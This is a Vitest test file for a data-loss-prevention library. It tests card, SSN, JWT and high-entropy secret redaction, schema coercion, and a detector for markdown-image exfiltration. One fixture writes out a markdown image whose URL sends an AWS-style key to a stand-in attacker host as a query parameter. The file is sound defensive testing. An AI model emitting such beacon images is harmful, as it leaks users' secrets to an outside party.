import { describe, it, expect } from 'vitest';
import {
  redactText,
  scanSecrets,
  luhnCheck,
  shannonEntropy,
  HIGH_ENTROPY_THRESHOLD,
} from '../packages/core/src/dlp.js';
import { scanIndirectInjection } from '../packages/core/src/indirect-injection.js';
import { coerceValueDeep } from '../packages/core/src/schema-validator.js';

/**
 * 0.2.0 DLP+ : Luhn-validated cards, SSN shape, high-entropy heuristic,
 * markdown-image exfil beacons, and recursive schema coercion.
 */
describe('luhnCheck', () => {
  it('accepts valid card numbers', () => {
    expect(luhnCheck('4111111111111111')).toBe(true); // Visa test
    expect(luhnCheck('5555555555554444')).toBe(true); // Mastercard test
    expect(luhnCheck('4111-1111-1111-1111')).toBe(true); // separators stripped
  });

  it('rejects bad check digits and wrong lengths', () => {
    expect(luhnCheck('4111111111111112')).toBe(false);
    expect(luhnCheck('123456789012')).toBe(false); // too short
    expect(luhnCheck('12345678901234567890')).toBe(false); // too long
  });
});

describe('CREDIT_CARD redaction', () => {
  it('redacts Luhn-valid card numbers', () => {
    const result = redactText('card 4111-1111-1111-1111 charged');
    expect(result.redacted).toBe(1);
    expect(result.types).toContain('CREDIT_CARD');
    expect(result.text).toContain('[REDACTED_SECRET: CREDIT_CARD]');
  });

  it('ignores digit runs that fail Luhn', () => {
    const result = redactText('order 1234-5678-9012-3456 shipped');
    expect(result.types).not.toContain('CREDIT_CARD');
  });
});

describe('SSN redaction', () => {
  it('redacts SSN-shaped values', () => {
    const result = redactText('ssn 123-45-6789 on file');
    expect(result.redacted).toBe(1);
    expect(result.types).toContain('SSN');
  });
});

describe('HIGH_ENTROPY_SECRET heuristic', () => {
  it('flags high-entropy opaque tokens', () => {
    const token = 'Kj9sDf2Hj5Kl8MnB3vCx4ZqW7eRt6YuI0oP1aS';
    expect(token.length).toBeGreaterThanOrEqual(32);
    expect(shannonEntropy(token)).toBeGreaterThan(HIGH_ENTROPY_THRESHOLD);
    const result = redactText(`token ${token} here`);
    expect(result.types).toContain('HIGH_ENTROPY_SECRET');
  });

  it('ignores hex UUIDs and plain prose', () => {
    expect(scanSecrets('id 550e8400-e29b-41d4-a716-446655440000 ok')).toEqual([]);
    expect(
      scanSecrets('the quick brown fox jumps over the lazy dog repeatedly').filter(
        (m) => m.type === 'HIGH_ENTROPY_SECRET',
      ),
    ).toEqual([]);
  });

  it('lets specific scanners win overlaps', () => {
    // A JWT is also high-entropy: the specific format must claim it first.
    const jwt = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
    const types = scanSecrets(`bearer ${jwt}`).map((m) => m.type);
    expect(types).toContain('JWT');
    expect(types).not.toContain('HIGH_ENTROPY_SECRET');
  });
});

describe('MD_IMAGE_EXFIL detector', () => {
  it('flags markdown images with long query payloads', () => {
    const md = 'see ![chart](https://evil.example.com/pixel?data=AKIAIOSFODNN7EXAMPLEEXTRA1234567890)';
    const result = scanIndirectInjection(md);
    expect(result.triggered).toBe(true);
    expect(result.findings.some((f) => f.type === 'MD_IMAGE_EXFIL')).toBe(true);
  });

  it('ignores ordinary doc images', () => {
    const md = 'see ![logo](https://example.com/img/logo.png) for details';
    const result = scanIndirectInjection(md);
    expect(result.triggered).toBe(false);
  });
});

describe('coerceValueDeep', () => {
  const schema = {
    type: 'object',
    properties: {
      n: { type: 'integer' },
      flag: { type: 'boolean' },
      tags: { type: 'array', items: { type: 'integer' } },
      nested: { type: 'object', properties: { x: { type: 'number' } } },
      keep: { type: 'string' },
    },
  } as Record<string, unknown> & { type?: unknown };

  it('coerces nested values and reports coercion', () => {
    const input = { n: '42', flag: 'true', tags: ['1', '2'], nested: { x: '3.5' }, keep: 's' };
    const { value, coerced } = coerceValueDeep(input, schema as never);
    expect(coerced).toBe(true);
    expect(value).toEqual({ n: 42, flag: true, tags: [1, 2], nested: { x: 3.5 }, keep: 's' });
    // input untouched (copy-on-write)
    expect(input).toEqual({ n: '42', flag: 'true', tags: ['1', '2'], nested: { x: '3.5' }, keep: 's' });
  });

  it('returns the original references when nothing coerces', () => {
    const input = { n: 42, keep: 's' };
    const { value, coerced } = coerceValueDeep(input, schema as never);
    expect(coerced).toBe(false);
    expect(value).toBe(input);
  });

  it('leaves unknown properties alone', () => {
    const { value, coerced } = coerceValueDeep({ extra: '42' }, schema as never);
    expect(coerced).toBe(false);
    expect(value).toEqual({ extra: '42' });
  });
});
